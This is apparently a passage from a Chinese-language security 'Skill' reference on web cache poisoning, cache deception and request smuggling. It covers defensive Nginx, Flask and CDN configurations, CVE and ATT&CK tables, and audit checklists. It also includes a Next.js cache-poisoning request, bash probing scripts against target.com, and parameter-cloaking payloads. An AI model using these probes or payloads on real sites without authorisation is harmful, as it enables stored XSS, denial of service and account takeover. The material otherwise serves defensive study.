  # 发送走私请求，然后立即发送正常请求
  # 观察正常请求是否返回走私的响应
  
  # 时间差检测法：
  # 如果 CL.TE：第二个请求延迟（后端等待走私请求完成）
  # 如果 TE.CL：立即返回走私响应（已缓存）

防御：
  # 前端和后端使用相同的 HTTP 解析器
  # 禁用 Transfer-Encoding（如果不需要）
  # 使用 HTTP/2（不易受走私攻击）
  # CDN 层面验证 Content-Length 一致性
  # 后端对走私请求添加标记头（X-Smuggled: true）
```

### 11. 防御最佳实践 (2025 更新)

```nginx
# ===== Nginx 全面防御配置 =====

# 1. 缓存键完整性
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=secure_cache:10m;

# 2. 认证端点完全禁用缓存
location ~* ^/api/ {
    proxy_cache off;
    add_header Cache-Control "no-store, no-cache, must-revalidate, private, max-age=0" always;
    add_header Pragma "no-cache" always;
    add_header Expires "0" always;
    add_header Vary "Authorization, Cookie" always;
    # 拒绝路径混淆请求
    if ($request_uri ~* "^/api/.*\.(css|js|png|jpg|gif|ico|svg|woff)") {
        return 403;
    }
}

# 3. 路径规范化
# Nginx 默认会规范化路径，但需确保：
# - 关闭 merge_slashes 仅在必要时
# - 路径解码后再匹配
location /static/ {
    proxy_cache secure_cache;
    proxy_cache_key "$scheme$host$uri$is_args$args";
    proxy_cache_valid 200 302 7d;
    proxy_cache_valid 404 1m;
    add_header X-Cache-Status $upstream_cache_status;
    # 只缓存 GET/HEAD
    proxy_cache_methods GET HEAD;
    # 不缓存大响应
    proxy_cache_max_range_offset 0;
}

# 4. 安全头中间件
add_header X-Content-Type-Options "nosniff" always;
# 防止 Content-Type 嗅探 → 降低 WCD 中 Content-Type 欺骗的效果
```

```python
# ===== 应用层防御框架 (Python/Flask) =====

from functools import wraps
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

# 中间件：全局安全缓存头
@app.after_request
def set_secure_cache_headers(response):
    path = request.path
    
    # API 路径：完全禁止缓存
    if path.startswith('/api/'):
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        response.headers['Vary'] = 'Authorization, Cookie'
    
    # 静态资源：允许缓存但设置合理 TTL
    elif path.startswith('/static/'):
        response.headers['Cache-Control'] = 'public, max-age=86400, immutable'
    
    # 其他页面：短期缓存 + 验证
    else:
        response.headers['Cache-Control'] = 'no-cache, must-revalidate'
        response.headers['Vary'] = 'Accept-Encoding, Accept-Language'
    
    # 防止 Content-Type 嗅探
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response

# 路径混淆检测装饰器
def reject_path_confusion(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        path = request.path
        # 检测可疑路径
        suspicious_patterns = [
            r'\.(css|js|png|jpg|gif|ico|svg|woff)$',
            r';.*\.(css|js)$',
            r'%00',
            r'\.\.',
            r'%2[fF]',
        ]
        import re
        for pattern in suspicious_patterns:
            if re.search(pattern, path):
                return jsonify({'error': 'Invalid path'}), 400
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/user/profile')
@reject_path_confusion
def user_profile():
    # ... 业务逻辑 ...
    pass
```

```
# ===== CDN 特定防御配置 =====

# Cloudflare Cache Rules（替代 Page Rules）：
# Rule 1: 不缓存 API 路径
#   If: URI Path starts with "/api/"
#   Then: Cache Eligibility = Bypass
#
# Rule 2: Cache Deception Armor = Enabled
#   （Cloudflare Dashboard → Caching → Cache Security）
#
# Rule 3: 静态资源正常缓存
#   If: URI Path starts with "/static/" OR URI Path ends with ".css" ".js" ".png"
#   Then: Cache Eligibility = Eligible, Edge TTL = 7 days
#
# Rule 4: 规范化 URL
#   URL Normalization = Enabled (Cloudflare 默认启用)

# AWS CloudFront Cache Policy：
# Policy Name: Secure-API-Policy
#   - TTL: 0 (不缓存)
#   - Query Strings: None (不缓存任何查询参数)
#   - Headers: Include Authorization, Cookie
#   - Cookies: Include All
#
# Policy Name: Static-Asset-Policy
#   - TTL: 86400
#   - Query Strings: None
#   - Headers: None
#   - Cookies: None

# Akamai Property Manager：
# Rule 1: /api/* → Cache-Control: no-store
#   - 行为: Caching → No Store
#   - 确保: Verify Cache-Control 头
# Rule 2: /static/* → Caching: Normal
#   - TTL: 7 days
# Rule 3: 启用 PFE (Property Forward Edit) 路径规范化

# Fastly VCL：
# 子程序 vcl_recv：
sub vcl_recv {
    # API 路径不缓存
    if (req.url ~ "^/api/") {
        return (pass);
    }
    # 路径混淆检测
    if (req.url ~ "^/api/.*\.(css|js|png)") {
        return (pass);
    }
}
# 子程序 vcl_hash：
sub vcl_hash {
    hash_data(req.url);
    hash_data(req.http.Host);
    # 包含认证头在缓存键中
    if (req.http.Authorization) {
        hash_data(req.http.Authorization);
    }
    if (req.http.Cookie ~ "session=") {
        hash_data(regsub(req.http.Cookie, "^.*session=([^;]*).*$", "\1"));
    }
}
```

### 12. 更新 MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1189 | Drive-by Compromise | 缓存投毒 + XSS 组合链 |
| Credential Access | T1539 | Steal Web Session Cookie | WCD 窃取会话/认证数据 |
| Credential Access | T1212 | Exploitation of Credential Access | 缓存键注入 + 认证绕过 |
| Defense Evasion | T1027 | Obfuscated Files | 路径混淆绕过缓存规则 |
| Defense Evasion | T1036 | Masquerading | 扩展名伪装欺骗 CDN |
| Discovery | T1082 | System Information Discovery | CDN 调试头信息泄露 |
| Lateral Movement | T1210 | Exploitation of Remote Services | CDN 层中间人攻击 |
| Collection | T1005 | Data from Local System | WCD 收集缓存的敏感数据 |
| Exfiltration | T1041 | Exfiltration Over C2 | 缓存欺骗数据泄露 |
| Exfiltration | T1567 | Exfiltration Over Web Service | 通过 CDN 缓存外泄数据 |
| Impact | T1498 | Network Denial of Service | 缓存投毒 + Smuggling DoS |
| Resource Development | T1584 | Compromise Infrastructure | CDN 配置利用 |

更新 CWE 映射：
| CWE ID | 名称 | 关联攻击 |
|--------|------|---------|
| CWE-444 | Inconsistent Interpretation of HTTP Requests | HTTP Request Smuggling + Cache |
| CWE-200 | Exposure of Sensitive Information | WCD 敏感数据泄露 |
| CWE-346 | Origin Validation Error | 缓存投毒 unkeyed 输入 |
| CWE-348 | Use of Less Trusted Source | CDN 头信任链问题 |
| CWE-441 | Inconsistent Interpretation of HTTP Requests | 缓存参数走私 |
| CWE-601 | URL Redirect to Untrusted Site | 缓存投毒 + 开放重定向 |
| CWE-79 | Cross-site Scripting (XSS) | 缓存投毒 + XSS 组合 |

更新来源：
- PortSwigger Research: "Gotta Cache 'Em All" — URL 解析差异利用
- USENIX Security: "Web Cache Deception Escalates" — WCD 学术研究
- Cloudflare Docs: Cache Deception Armor — 官方防护机制
- Akamai Blog: HTTP Cache Poisoning Advisory — 官方公告

---

## Part D：2025-2026 最新研究补充（精细复核）

> 基于 PortSwigger Top 10 (2025)、zhero_web_security Next.js 研究、CVE-2025-57752/CVE-2026-24472 等，
> 以及奇安信/阿里云/腾讯云中文社区资料。

### 13. 内部缓存投毒（Internal Cache Poisoning）— 框架级攻击面

```
PortSwigger Top 10 Web Hacking Techniques of 2025 #7:
  "Next.js, cache, and chains: the stale elixir"

传统 Web Cache Poisoning 关注 CDN/反向代理层的缓存，
但现代框架（Next.js/Nuxt.js/SvelteKit）有**自己的内部缓存层**，
这一层同样存在投毒风险，且更容易被忽视。

核心发现（zhero_web_security）：
  Next.js Pages Router 的非动态 SSR 路由存在缓存投毒漏洞（CVE-2024-46982）。
  通过组合两个内部机制实现攻击：

  1. __nextDataReq URL 参数：
     - 添加 ?__nextDataReq=1 让 Next.js 将请求视为"数据请求"
     - 返回纯 JSON 而非完整 HTML 页面
     - 该参数不参与 Next.js 内部缓存键计算

  2. x-now-route-matches 请求头：
     - Vercel 部署环境使用的内部路由匹配头
     - 可被外部注入以操纵路由解析
     - 在 Next.js < 15.1.6 中未被过滤

攻击链：
  GET /target-page?__nextDataReq=1
  Host: target.com
  x-now-route-matches: 1

  → Next.js 将恶意数据请求的响应当作正常页面缓存
  → 后续所有用户访问 /target-page 时收到被投毒的响应
  → 可实现：Stored XSS、DoS、账号接管

真实案例：
  - Exchange 零点击大规模账号接管（@Maverick0o0）
    添加 __nextDataReq 到登录路径 → 返回 JSON 而非登录页
    → 缓存投毒 → 所有后续用户收到 JSON 响应而非登录页

修复：
  - Next.js ≥ 15.1.6：从外部请求中剥离 x-now-route-matches 头
  - Next.js ≥ 15.4.5：修复 Image Optimization 缓存欺骗
  - 缓解：在 CDN/反向代理层剥离 x-now-route-matches 头
```

```bash
# Next.js 内部缓存投毒检测

# 步骤 1：识别 Next.js 应用
curl -sI https://target.com/ | grep -i "x-powered-by.*Next.js\|__next"

# 步骤 2：测试 __nextDataReq 参数
curl -s "https://target.com/some-page" | head -c 200
curl -s "https://target.com/some-page?__nextDataReq=1" | head -c 200
# 如果第二个返回 JSON → __nextDataReq 有效

# 步骤 3：测试 x-now-route-matches 头
curl -sI -H "x-now-route-matches: 1" "https://target.com/some-page?__nextDataReq=1"
# 检查 Cache-Control 头和响应内容

# 步骤 4：自动化检测脚本
#!/bin/bash
TARGET="https://target.com"
PATHS=("/" "/about" "/contact" "/dashboard")

for path in "${PATHS[@]}"; do
  echo "=== Testing $path ==="

  # 正常请求
  normal=$(curl -s "$TARGET$path" | head -c 100)

  # __nextDataReq 请求
  datareq=$(curl -s "$TARGET$path?__nextDataReq=1" | head -c 100)

  # 带路由匹配头的请求
  poisoned=$(curl -s -H "x-now-route-matches: 1" "$TARGET$path?__nextDataReq=1" | head -c 100)

  if [ "$normal" != "$datareq" ]; then
    echo "[!] __nextDataReq 有效: $path"
  fi

  if [ "$normal" != "$poisoned" ]; then
    echo "[!!] x-now-route-matches 影响响应: $path"
  fi
done
```

### 14. 2025-2026 缓存相关 CVE 速查

```
┌──────────────────┬──────────────────────────────────────────────────────────────────────┐
│ CVE              │ 详情                                                                │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2024-46982   │ Next.js Pages Router 缓存投毒                                       │
│                  │ x-now-route-matches + __nextDataReq 组合                             │
│                  │ 影响：Stored XSS、DoS、账号接管                                      │
│                  │ 修复：Next.js ≥ 15.1.6（剥离 x-now-route-matches）                  │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2025-4366    │ Cloudflare Pingora HTTP 请求走私                                     │
│                  │ HTTP/1.1 缓存用户面临请求注入和缓存投毒风险                          │
│                  │ 严重性：High                                                        │
│                  │ 研究：ZeroPath 深度分析                                              │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2025-55173   │ Next.js Image Optimization 内容注入                                  │
│                  │ 与 CVE-2025-57752 同源，Image Optimization 管道内容注入              │
│                  │ 修复：Next.js ≥ 14.2.31 / ≥ 15.4.5                                 │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2025-57752   │ Next.js Image Optimization 缓存欺骗                                  │
│                  │ 缓存键混淆导致认证用户私有图片泄露                                    │
│                  │ API 路由返回基于认证状态的图片时受影响                                 │
│                  │ 影响：未授权内容泄露                                                  │
│                  │ 修复：Next.js ≥ 14.2.31 / ≥ 15.4.5                                 │
│                  │ 参考：GHSA-g5qg-72qw-gw5v、Vercel/Netlify 官方公告                  │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2026-24472   │ Hono Cache Middleware Web 缓存欺骗                                   │
│                  │ Cache Middleware 忽略 Cache-Control: private 头                      │
│                  │ 导致认证用户敏感数据被缓存并暴露给未认证用户                           │
│                  │ 影响：敏感信息泄露                                                   │
│                  │ 修复：Hono ≥ 4.11.7                                                 │
│                  │ 参考：GHSA-6wqw-2p9w-4vw4                                          │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2026-26365   │ Akamai CDN HTTP 请求走私                                             │
│                  │ hop-by-hop 头处理错误                                                │
│                  │ 可绕过安全控制、投毒缓存、冒充用户                                    │
│                  │ 严重性：High                                                        │
├──────────────────┼──────────────────────────────────────────────────────────────────────┤
│ CVE-2026-3125    │ OpenNext.js for Cloudflare SSRF                                      │
│                  │ @opennextjs/cloudflare 路径规范化问题                                 │
│                  │ 可能导致服务器向内部资源发起请求                                       │
└──────────────────┴──────────────────────────────────────────────────────────────────────┘
```

### 15. Cache Entanglement — 多层缓存纠缠攻击

```
PortSwigger Research (James Kettle):
  "Web Cache Entanglement: Novel Pathways to Poisoning"

核心洞察：
  现代 Web 应用通常有**多层缓存**：
  Layer 1: CDN 缓存 (Cloudflare/Cloudfront/Akamai)
  Layer 2: 反向代理缓存 (Nginx/Varnish)
  Layer 3: 应用框架缓存 (Next.js ISR/Laravel Cache)
  Layer 4: 应用内缓存 (Redis/Memcached/内存)

  每层缓存可能有**不同的缓存键规则**：
  - Layer 1: 只看 URL
  - Layer 2: URL + Host
  - Layer 3: URL + Cookie
  - Layer 4: 完全自定义

  攻击者可以利用层间差异，在某一层投毒后影响其他层。

攻击手法：
  1. 探测法（Probing）：
     - 发送精心构造的请求序列
     - 通过响应时间和内容差异判断缓存层行为
     - 无需直接访问缓存配置

  2. 缓存键不一致利用：
     - CDN 缓存键: URL（不含 Accept 头）
     - 应用缓存键: URL + Accept 头
     - 发送恶意 Accept 头 → 应用缓存恶意响应
     - CDN 缓存正常请求 → 但应用层返回缓存的恶意响应

  3. gadget 链：
     - 找到 unkeyed 输入 → 控制响应中的某个字段
     - 该字段被后续处理逻辑使用 → 触发第二个漏洞
     - 组合形成"缓存投毒 gadget 链"

实际测量（ACM CCS 2024）：
  "Detecting and Measuring Web Cache Poisoning in the Wild"
  - 首次大规模测量真实环境中 WCP 漏洞的流行度
  - 发现大量站点存在可利用的缓存投毒条件
  - 多层缓存场景下的漏洞尤为普遍
```

```bash
# Cache Entanglement 检测方法论

# 步骤 1：识别多层缓存
# 发送请求并观察缓存标识
curl -sI https://target.com/ | grep -iE "x-cache|cf-cache|age|x-varnish|x-fastly"

# 步骤 2：逐层探测缓存键
# 测试 CDN 层
curl -s -D- -H "Accept-Language: en" https://target.com/ | grep "X-Cache\|Age"
curl -s -D- -H "Accept-Language: zh" https://target.com/ | grep "X-Cache\|Age"

# 测试应用层（绕过 CDN 直接访问源站，如果可能）
curl -s -D- -H "Host: target.com" https://origin-ip/ | grep "X-Cache\|Age"

# 步骤 3：寻找层间不一致
# CDN 认为 A/B 请求相同 → 返回缓存的 A
# 应用认为 A/B 不同 → 应返回不同内容
# 如果实际返回了 A 的内容给 B 请求 → 缓存键不一致

# 步骤 4：构建 gadget 链
# 找到影响响应但不参与任何缓存键的输入
for header in "X-Forwarded-Host" "X-Forwarded-Proto" "X-Original-URL" \
  "X-Rewrite-URL" "Forwarded" "X-Forwarded-For" "X-Real-IP" \
  "Accept" "Accept-Encoding" "Accept-Language" "Origin" \
  "Referer" "If-Modified-Since" "If-None-Match"; do
  echo "=== $header ==="
  resp1=$(curl -s -o /dev/null -w "%{http_code}" -H "$header: test1" https://target.com/)
  resp2=$(curl -s -o /dev/null -w "%{http_code}" -H "$header: test2" https://target.com/)
  if [ "$resp1" = "$resp2" ]; then
    echo "  [?] $header 可能不参与缓存键"
  fi
done
```

### 16. 框架级缓存安全审计清单

```
Next.js 缓存安全检查项：
  □ ISR (Incremental Static Regeneration) 缓存键是否包含认证信息
  □ Image Optimization 缓存是否正确区分认证/未认证用户
  □ __nextDataReq 参数是否被 CDN 层正确处理
  □ x-now-route-matches 头是否被 CDN 剥离
  □ _next/data/* 路径的缓存策略是否安全
  □ getServerSideProps 返回的敏感数据是否标记 no-store
  □ middleware.ts 中的缓存头设置是否正确

Nuxt.js 缓存安全检查项：
  □ routeRules 中的缓存配置是否区分动态/静态内容
  □ nitro.cache 设置是否安全
  □ SSR 渲染的页面是否正确设置 Cache-Control

SvelteKit 缓存安全检查项：
  □ +page.server.ts 中的 cache 配置
  □ adapter 配置的缓存行为
  □ CSR fallback 缓存策略

通用框架级检查：
  □ 框架内部缓存的缓存键是否包含足够信息（Cookie/Auth）
  □ 静态导出页面是否被正确标记为可缓存
  □ API 路由是否明确设置 no-store
  □ 错误页面是否被意外缓存
  □ 重定向响应是否被缓存（可能导致开放重定向放大）
```

### 17. 中文社区精华

```
奇安信 2025 漏洞态势：
  - Web 缓存类漏洞在大型互联网公司渗透测试中高频出现
  - CDN 配置错误是最常见的根本原因
  - 云原生架构下缓存层增多 → 攻击面扩大

阿里云 ESA（边缘安全加速）缓存欺骗防御：
  - 官方文档明确说明缓存欺骗攻击原理和防御方法
  - 阿里云 CDN/DCDN 支持"缓存欺骗防护"功能
  - 自动检测路径与 Content-Type 不匹配并拒绝缓存
  - 参考：help.aliyun.com/zh/edge-security-acceleration/esa/user-guide/cache-spoofing-defense

腾讯云开发者社区精华：
  - Web Cache Vulnerability Scanner 工具介绍（Go 语言）
  - 自动化检测缓存投毒漏洞
  - 支持 Cloudflare/Cloudfront/Akamai 等主流 CDN
  - 参考：cloud.tencent.com/developer/article/1946378

安全客/嘶吼 实战总结：
  - Web Cache Poisoning vs Web Cache Deception 对比分析
  - 缓存欺骗比缓存投毒更普遍且更容易利用
  - 隐蔽路由投毒（Hidden Route Poisoning）高级技术
  - HTTP 响应拆分 + Request Smuggling 组合攻击

先知社区 (xz.aliyun.com)：
  - 持续有缓存攻击相关投稿，重点关注 CDN 配置审计
  - 实战案例多涉及国内云厂商（阿里云/腾讯云/华为云 CDN）
```

### 18. 防御升级路线图

```
P0 — 立即行动（修复已知漏洞）：
  □ 升级 Next.js 至 ≥ 15.4.5（修复 CVE-2025-57752/CVE-2024-46982）
  □ 升级 Hono 至 ≥ 4.11.7（修复 CVE-2026-24472）
  □ 在 CDN 层剥离 x-now-route-matches 头
  □ 审计所有 /api/* 端点的 Cache-Control 头

P1 — 短期（1-2 周）：
  □ 启用 Cloudflare Cache Deception Armor
  □ 配置 CDN Cache Rules 明确区分动态/静态内容
  □ 审计框架级缓存配置（Next.js ISR/Nuxt routeRules）
  □ 实施多层缓存键一致性检查

P2 — 中期（1-3 月）：
  □ 部署自动化缓存安全扫描（Web Cache Vulnerability Scanner）
  □ 建立 CDN 配置安全基线（不允许缓存 /api/* 和认证路径）
  □ 实施路径规范化中间件
  □ 对开发团队进行缓存安全培训

P3 — 长期（持续）：
  □ 建立 CDN 配置变更审计流程
  □ 定期运行缓存安全扫描并修复发现
  □ 监控缓存命中率异常（可能的攻击指标）
  □ 跟踪 PortSwigger/CDN 厂商最新研究和公告
```

### 19. 更新 MITRE ATT&CK 映射（扩展）

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1189 | Drive-by Compromise | 缓存投毒 + XSS 组合链 |
| Credential Access | T1539 | Steal Web Session Cookie | WCD 窃取会话/认证数据 |
| Credential Access | T1212 | Exploitation of Credential Access | 缓存键注入 + 认证绕过 |
| Defense Evasion | T1027 | Obfuscated Files | 路径混淆绕过缓存规则 |
| Defense Evasion | T1036 | Masquerading | 扩展名伪装欺骗 CDN |
| Defense Evasion | T1190 | Exploit Public-Facing Application | Next.js 内部缓存投毒 |
| Discovery | T1082 | System Information Discovery | CDN 调试头信息泄露 |
| Lateral Movement | T1210 | Exploitation of Remote Services | CDN 层中间人攻击 |
| Collection | T1005 | Data from Local System | WCD 收集缓存的敏感数据 |
| Exfiltration | T1041 | Exfiltration Over C2 | 缓存欺骗数据泄露 |
| Exfiltration | T1567 | Exfiltration Over Web Service | 通过 CDN 缓存外泄数据 |
| Impact | T1498 | Network Denial of Service | 缓存投毒 + Smuggling DoS |
| Resource Development | T1584 | Compromise Infrastructure | CDN 配置利用 |

更新来源（完整版）：
- PortSwigger Research: "Gotta Cache 'Em All" — URL 解析差异利用
- PortSwigger Research: "Web Cache Entanglement" — 多层缓存投毒（James Kettle, Black Hat 2020）
- PortSwigger Top 10 (2025) #7: "Next.js, cache, and chains: the stale elixir" — 内部缓存投毒
- zhero_web_security: Next.js Cache Poisoning 研究 — CVE-2024-46982 实战分析
- USENIX Security: "Web Cache Deception Escalates" — WCD 学术研究
- ACM CCS 2024: "Detecting and Measuring Web Cache Poisoning in the Wild" — 大规模测量
- Cloudflare Docs: Cache Deception Armor — 官方防护机制
- Cloudflare Docs: Pingora CVE-2025-4366 — HTTP 请求走私
- Akamai Blog: HTTP Cache Poisoning Advisory — 官方公告
- Akamai: CVE-2026-26365 — hop-by-hop 头处理错误
- HeroDevs: CVE-2025-57752/CVE-2025-55173 — Next.js Image Optimization
- Hono GHSA-6wqw-2p9w-4vw4: CVE-2026-24472 — Cache Middleware WCD
- 阿里云 ESA: 缓存欺骗防御文档
- 腾讯云: Web Cache Vulnerability Scanner 工具介绍
- 奇安信: 2025 漏洞态势报告

### 20. HTTP/2 专属缓存投毒变体（伪头缓存键 / Fat GET / 参数伪装）

> 缓存层对 HTTP/2 的**伪头（pseudo-header）**、**降级翻译**、**body 处理**与后端不一致时，
> 会产生「H1 时代不存在的」缓存投毒面。以下为 2025 起持续被报告的变体。

#### 20.1 伪头参与缓存键

- HTTP/2 请求的 `:method` / `:path` / `:authority` / `:scheme` 是伪头。缓存若把**某些伪头
  排除了缓存键**，而后端又根据这些伪头改变响应 → unkeyed 投毒。
- 例：缓存键只含 `:path`，不含 `:authority`；后端按 `:authority` 生成页面上的绝对 URL →
  投毒后所有命中该 path 的域名/主机共享被投毒响应。
- 判据：改 `:authority` 后第二次请求仍 HIT 且响应内容随 `:authority` 变化 = 伪头 unkeyed。

#### 20.2 Fat GET（带 body 的 GET 投毒）

- HTTP/2 允许 GET 携带请求体。缓存/代理对「GET + body」处理不一致：缓存把 `GET` 当纯 GET
  建缓存键（忽略 body），后端却把 body 当参数解析。
- 利用：`GET /path` + body 里塞 `id=admin`，缓存键只有 `/path`，但后端按 body 返回 admin 数据 →
  缓存被 admin 响应投毒，后续普通 GET 命中 admin 内容。
- 判据：`GET + body` 请求命中缓存后，普通 GET（无 body）拿到 body 驱动的响应。

#### 20.3 参数伪装（Parameter Cloaking）2025 新变体

- **参数伪装**：缓存与后端对「哪些字节算参数」解析不一致，使缓存键与后端语义分裂。
- 变体 1（分号分隔）：`/path?a=1;b=admin` —— 缓存键含完整串，后端把 `;` 当 `&` 解析出 `b=admin`。
- 变体 2（`%26`/`%3F` 二次解码）：`/path?a=1%26role=admin` —— 缓存按编码串建键，后端二次解码
  后得到 `role=admin`。
- 变体 3（H2 `:path` 与 H1 `?` 翻译差异）：`/path?x=1%3Fy=2` 在 H2→H1 降级时被不同层解码次数不同。
- 判据：构造「缓存键一致、后端语义不同」的两个 URL，观察是否互相污染缓存。

#### 20.4 与请求走私的叠加

- HTTP/2 → HTTP/1.1 降级走私 + 缓存投毒叠加：走私的「第二个请求」被缓存后，污染后续所有
  命中者（见 §10 与 `web-request-smuggling.md`）。

#### 20.5 防御

| 措施 | 说明 |
|---|---|
| 缓存键纳入全部影响响应的伪头 | `:authority`/`:scheme` 按需入键 |
| 拒绝/规范化 GET+body | 明确 GET 不带 body 或 body 入缓存键 |
| 参数解析与后端一致 | 分号/`%26`/`?` 解码次数对称 |
| 缓存键覆盖 body 敏感字段 | body 驱动响应的字段必须 keyed |

> 来源：PortSwigger（Gotta Cache 'Em All / Web Cache Entanglement）、Cloudflare/Akamai 2025 公告
> （参数伪装与 H2 伪头缓存键）。本文为原理重构，未整篇搬运。
